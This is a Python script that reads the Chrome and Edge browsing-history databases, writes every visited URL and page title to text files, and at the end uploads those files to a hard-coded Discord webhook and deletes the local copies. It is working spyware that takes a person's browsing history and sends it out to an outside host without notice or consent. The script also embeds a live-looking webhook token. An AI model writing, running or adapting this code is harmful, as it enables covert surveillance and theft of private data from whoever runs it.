import os
import shutil
import sqlite3
import sys
import requests

def get_edge_history_path():
    """Determines the default Edge History file path based on the OS."""
    home = os.path.expanduser("~")
    if sys.platform.startswith("win"):
        return os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
    elif sys.platform.startswith("darwin"):
        return os.path.join(home, "Library", "Application Support", "Microsoft Edge", "Default", "History")
    elif sys.platform.startswith("linux"):
        return os.path.join(home, ".config", "microsoft-edge", "Default", "History")
    else:
        raise OSError("Unsupported operating system.")

def get_chrome_history_path():
    """Determines the default Chrome History file path based on the OS."""
    home = os.path.expanduser("~")
    if sys.platform.startswith("win"):
        return os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
    elif sys.platform.startswith("darwin"):
        return os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "History")
    elif sys.platform.startswith("linux"):
        return os.path.join(home, ".config", "google-chrome", "Default", "History")
    else:
        raise OSError("Unsupported operating system.")

def process_browser_history(history_path, browser_name):
    """Helper function to read database and output file if browser history exists."""
    if not os.path.exists(history_path):
        print(f"Skipping: {browser_name} history file not found.")
        return False

    temp_db = f"{browser_name.lower()}_history_temp.db"
    output_file = f"{browser_name.lower()}_history_output.txt"
    
    conn = None  # Initialize connection variable outside try block
    try:
        # Copy file to prevent database locked errors
        shutil.copyfile(history_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Chronological True History Query (3 items selected)
        query = """
        SELECT urls.url, urls.title, visits.visit_time 
        FROM visits 
        JOIN urls ON visits.url = urls.id 
        ORDER BY visits.visit_time DESC;
        """
        cursor.execute(query)
        results = cursor.fetchall()
        
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(f"{'Title':<50} | {'URL'}\n")
            f.write("-" * 100 + "\n")
            
            # FIXED: Unpacking exactly 3 variables to match the SELECT query above
            for url, title, visit_time in results:
                display_title = title if title else "No Title"
                line = f"{display_title:<50} | \n{url}\n\n"
                f.write(line)
        
        print(f"Success: extracted {browser_name} history to {output_file}")
        cursor.close()

    except sqlite3.OperationalError as e:
        print(f"Database error on {browser_name}: {e}.")
        print("-> Please close your browser completely and run the script again.")
    except Exception as e:
        print(f"An error occurred while processing {browser_name}: {e}")
    finally:
        # FIXED: Explicitly close the database connection first
        if conn:
            conn.close()
        
        # Now Windows will safely allow you to remove the temp file
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except OSError as e:
                print(f"Cleanup warning: Could not remove {temp_db}. {e}")
                
    return False

def fetch_history():
    # Process Chrome
    try:
        chrome_path = get_chrome_history_path()
        process_browser_history(chrome_path, "Chrome")
    except OSError as e:
        print(e)

    # Process Edge
    try:
        edge_path = get_edge_history_path()
        process_browser_history(edge_path, "Edge")
    except OSError as e:
        print(e)

if __name__ == "__main__":
    fetch_history()

    webhook_url = "https://discord.com/api/webhooks/1515633235831558244/gR0lZeizliYYjaAa1LGIF0ixUAX7fe4bpeZbvicyqUynCpslFBPua7qbQGhh-8ByZew0"
    file_path = ["edge_history_output.txt", "chrome_history_output.txt"]
    for path in file_path:
        with open(path, "rb") as f:
            # The key MUST be named 'file'
            response = requests.post(webhook_url, files={"file": f})


    if os.path.exists("edge_history_output.txt") and os.path.exists("chrome_history_output.txt"):
            os.remove("edge_history_output.txt")
            os.remove("chrome_history_output.txt")